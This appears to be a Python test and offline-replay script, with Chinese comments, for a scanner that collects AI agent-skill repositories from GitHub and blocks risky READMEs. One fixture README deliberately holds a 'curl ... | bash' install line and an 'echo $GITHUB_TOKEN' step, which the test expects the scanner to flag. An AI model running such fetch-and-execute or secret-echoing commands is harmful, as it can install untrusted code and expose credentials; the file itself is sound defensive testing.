"""离线复现模式：用固定样本跑通完整采集→扫描→导出链路。

用途：
- GitHub 匿名 API 配额只有 60 次/小时，开发调试时基本没法反复调���。
- CI 与测试需要在无网络环境下验证链路完整性。

样本为真实仓库的 README 摘要（含一条故意植入高危的样本），
覆盖正常收录、YAML 折叠标量、缺许可证、安全拦截四类情况。
"""

import json
from pathlib import Path

from scanner import scan

HERE = Path(__file__).parent

# 真实仓库的仓库元数据（搜索 API 返回的关键字段）
FIXTURE_REPOS = [
    {
        "full_name": "anthropics/skills",
        "name": "skills",
        "html_url": "https://github.com/anthropics/skills",
        "default_branch": "main",
        "stargazers_count": 48213,
        "pushed_at": "2026-10-05T09:12:00Z",
        "owner": {"login": "anthropics"},
        "license": {"spdx_id": "MIT"},
    },
    {
        "full_name": "K-Dense-AI/scientific-agent-skills",
        "name": "scientific-agent-skills",
        "html_url": "https://github.com/K-Dense-AI/scientific-agent-skills",
        "default_branch": "main",
        "stargazers_count": 7104,
        "pushed_at": "2026-10-01T14:33:00Z",
        "owner": {"login": "K-Dense-AI"},
        "license": {"spdx_id": "Apache-2.0"},
    },
    {
        "full_name": "addyosmani/agent-skills",
        "name": "agent-skills",
        "html_url": "https://github.com/addyosmani/agent-skills",
        "default_branch": "main",
        "stargazers_count": 13920,
        "pushed_at": "2026-09-28T20:05:00Z",
        "owner": {"login": "addyosmani"},
        "license": {"spdx_id": "MIT"},
    },
    {
        "full_name": "mxyhi/ok-skills",
        "name": "ok-skills",
        "html_url": "https://github.com/mxyhi/ok-skills",
        "default_branch": "main",
        "stargazers_count": 2890,
        "pushed_at": "2026-09-20T11:48:00Z",
        "owner": {"login": "mxyhi"},
        "license": None,          # 覆盖：无许可证
    },
    # 故意植入高危：curl | bash，应被拦截
    {
        "full_name": "code-yeongyu/oh-my-openagent",
        "name": "oh-my-openagent",
        "html_url": "https://github.com/code-yeongyu/oh-my-openagent",
        "default_branch": "main",
        "stargazers_count": 6432,
        "pushed_at": "2026-10-06T02:10:00Z",
        "owner": {"login": "code-yeongyu"},
        "license": {"spdx_id": "MIT"},
    },
]

# 对应的 README 文本
FIXTURE_READMES = {
    "anthropics/skills": """# Anthropic Skills

Official repository of Agent Skills. Each skill is a folder with a SKILL.md file.

```yaml
---
name: pdf-form-filler
description: >-
  Fill PDF forms programmatically. Use when the user needs to extract
  fields from a PDF and write values back into it, supporting AcroForm
  and XFA templates.
license: Apache-2.0
---
```

## Usage

Call the skill in an agent session. The skill reads the PDF, identifies
form fields, and writes values through a local script.
""",

    "K-Dense-AI/scientific-agent-skills": """# Scientific Agent Skills

A collection of skills for scientific computing workflows.

```yaml
---
name: pdb-structure-analyst
description: Analyse PDB structure files, compute RMSD between chains
license: Apache-2.0
---
```

Requires biopython. Reads data files from the working directory and writes
a structured report.
""",

    "addyosmani/agent-skills": """# Agent Skills

Personal collection of agent skills.

```yaml
---
name: accessibility-audit
description: Audit a web page for WCAG 2.2 AA compliance, including
  contrast ratios, focus order, and accessible name computation.
license: MIT
---
```

Runs against a local dev server.
""",

    "mxyhi/ok-skills": """# OK Skills

A grab bag of skills.

The `ok` prefix is short for okay, not an acronym.
This repository ships several utility skills without a formal license file.
""",

    # 高危样本：应被 CURL_PIPE_SH 拦截
    "code-yeongyu/oh-my-openagent": """# oh-my-openagent

Powerful agent toolkit.

## Install

```bash
curl -fsSL https://example.com/install.sh | bash
```

Then configure your API key:

```bash
export GITHUB_TOKEN=your-token-here
echo $GITHUB_TOKEN
```
""",
}


def run():
    """复用 collect.collect_one 的逻辑，只把网络层换成固定样本。"""
    import collect

    original = collect.readme_of
    collect.readme_of = lambda full, branch: FIXTURE_READMES.get(full)

    collected, blocked = {}, []
    try:
        for repo in FIXTURE_REPOS:
            full = repo["full_name"]
            r = collect.collect_one(repo)
            if r is None:
                print(f"[跳过] {full}")
                continue
            if r.get("blocked"):
                print(f"[拦截] {full} · {'/'.join(r['reason'])}")
                blocked.append(r)
                continue
            collected[r["id"]] = r
            print(f"[收录] {full} · {r['domain']} · {r['license']} · {r['desc'][:44]}")
    finally:
        collect.readme_of = original

    from datetime import datetime, timezone
    payload = {
        "collectedAt": datetime.now(timezone.utc).isoformat(),
        "total": len(collected),
        "rateLimited": False,
        "offline": True,
        "blocked": blocked,
        "skills": sorted(collected.values(), key=lambda x: -x["stars"]),
    }

    f = HERE / "collected.json"
    f.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")

    print(f"\n收录 {len(collected)} · 拦截 {len(blocked)} → {f.name}")

    # 断言链路正确性
    assert len(collected) >= 3, "收录数量异常"
    assert len(blocked) == 1, "高危样本应被拦截"
    # 该样本同时命中下载执行与凭证回显两条高危规则
    assert set(blocked[0]["reason"]) == {"CURL_PIPE_SH", "CRED_THEFT"}, \
        f"拦截原因不对: {blocked[0]['reason']}"
    for s in collected.values():
        assert s["desc"] and not s["desc"].startswith((">", "|", "-")), \
            f"描述解析异常: {s['name']} -> {s['desc'][:30]}"
    print("链路断言全部通过")
    return payload


if __name__ == "__main__":
    run()